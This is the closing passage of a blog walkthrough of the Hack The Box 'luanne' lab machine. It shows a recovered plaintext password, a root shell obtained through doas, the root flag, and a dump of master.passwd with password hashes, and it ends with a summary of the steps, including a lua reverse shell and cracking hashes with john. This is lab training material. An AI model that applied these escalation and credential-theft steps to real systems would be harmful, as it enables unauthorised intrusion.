+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webapi_user:littlebear</span><br></pre></td></tr></table></figure>
+
+<p>We got the password littlebear</p>
+<p>But the problem is we cant change the user because sudo is not working.</p>
+<p>After some google search i found the way to switch the user to root.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9tYW4ub3BlbmJzZC5vcmcvZG9hcy4x">doas — execute commands as another user<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">luanne$ doas -u root /bin/sh</span><br><span class="line">Password:</span><br><span class="line">sh: Cannot determine current working directory</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(wheel) <span class="built_in">groups</span>=0(wheel),2(kmem),3(sys),4(<span class="built_in">tty</span>),5(operator),20(staff),31(guest),34(nvmm)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span>: getcwd() failed: No such file or directory</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">7a9b5c206e8e8ba09bb99bd113675f66</span><br></pre></td></tr></table></figure>
+
+<p>and we got root.txt, and finished the box.</p>
+<ul>
+<li>root hash:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat master.passwd</span></span><br><span class="line">root:$sha1$23801$4UJhvV0t<span class="variable">$hToalyVeYBLnwnyB6uvsIJfPPCC4</span>:0:0::0:0:Charlie &amp;:/root:/bin/sh</span><br><span class="line">toor:*:0:0::0:0:Bourne-again Superuser:/root:/bin/sh</span><br><span class="line">daemon:*:1:1::0:0:The devil himself:/:/sbin/nologin</span><br><span class="line">operator:*:2:5::0:0:System &amp;:/usr/guest/operator:/sbin/nologin</span><br><span class="line">bin:*:3:7::0:0:Binaries Commands and Source:/:/sbin/nologin</span><br><span class="line">games:*:7:13::0:0:&amp; pseudo-user:/usr/games:/sbin/nologin</span><br><span class="line">postfix:*:12:12::0:0:&amp; pseudo-user:/var/spool/postfix:/sbin/nologin</span><br><span class="line">named:*:14:14::0:0:&amp; pseudo-user:/var/chroot/named:/sbin/nologin</span><br><span class="line">ntpd:*:15:15::0:0:&amp; pseudo-user:/var/chroot/ntpd:/sbin/nologin</span><br><span class="line">sshd:*:16:16::0:0:&amp; pseudo-user:/var/chroot/sshd:/sbin/nologin</span><br><span class="line">_pflogd:*:18:18::0:0:&amp; pseudo-user:/var/chroot/pflogd:/sbin/nologin</span><br><span class="line">_rwhod:*:19:19::0:0:&amp; pseudo-user:/var/rwho:/sbin/nologin</span><br><span class="line">_proxy:*:21:21::0:0:Proxy Services:/nonexistent:/sbin/nologin</span><br><span class="line">_timedc:*:22:22::0:0:&amp; pseudo-user:/nonexistent:/sbin/nologin</span><br><span class="line">_sdpd:*:23:23::0:0:&amp; pseudo-user:/nonexistent:/sbin/nologin</span><br><span class="line">_httpd:*:24:24::0:0:&amp; pseudo-user:/var/www:/sbin/nologin</span><br><span class="line">_mdnsd:*:25:25::0:0:&amp; pseudo-user:/nonexistent:/sbin/nologin</span><br><span class="line">_tests:*:26:26::0:0:&amp; pseudo-user:/nonexistent:/sbin/nologin</span><br><span class="line">_tcpdump:*:27:27::0:0:&amp; pseudo-user:/var/chroot/tcpdump:/sbin/nologin</span><br><span class="line">_tss:*:28:28::0:0:&amp; pseudo-user:/var/tpm:/sbin/nologin</span><br><span class="line">_rtadvd:*:30:30::0:0:&amp; pseudo-user:/var/chroot/rtadvd:/sbin/nologin</span><br><span class="line">_unbound:*:32:32::0:0:&amp; pseudo-user:/var/chroot/unbound:/sbin/nologin</span><br><span class="line">_nsd:*:33:33::0:0:&amp; pseudo-user:/var/chroot/nsd:/sbin/nologin</span><br><span class="line">uucp:*:66:1::0:0:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin</span><br><span class="line">nobody:*:32767:39::0:0:Unprivileged user:/nonexistent:/sbin/nologin</span><br><span class="line">r.michaels:$sha1$24334<span class="variable">$unLQu</span>/.W<span class="variable">$CtjrV4vz9ansOLIXDJMlzu1gSPC3</span>:1000:100::0:0::/home/r.michaels:/bin/ksh</span><br><span class="line">nginx:*************:1001:1000::0:0:NGINX server user:/var/db/nginx:/sbin/nologin</span><br><span class="line">dbus:*************:1002:1001::0:0:System message bus:/var/run/dbus:/sbin/nologin</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb132.jpg"></li>
+</ul>
+<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
+<li>gobuster dir fuzz</li>
+<li>use lua syntax and gtfobins, mkfifo to get the reverse shell with lua.</li>
+<li>crack md5crypt-long hash with john</li>
+<li>use id_rsa file to ssh login</li>
+<li>use netpgp to extract the file of .enc</li>
+<li>Privilege escalation via doas execute commands as another user</li>
+</ul>
+<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/12/04/luanne/" title="Hack-The-Box-walkthrough[luanne]">https://fdlucifer.github.io/2020/12/04/luanne/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/11/28/crossfit/" rel="prev" title="Hack-The-Box-walkthrough[crossfit]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[crossfit]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/12/14/Escaping-Docker-Privileged-Containers/" rel="next" title="docker逃逸容器提权">
+                  docker逃逸容器提权 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
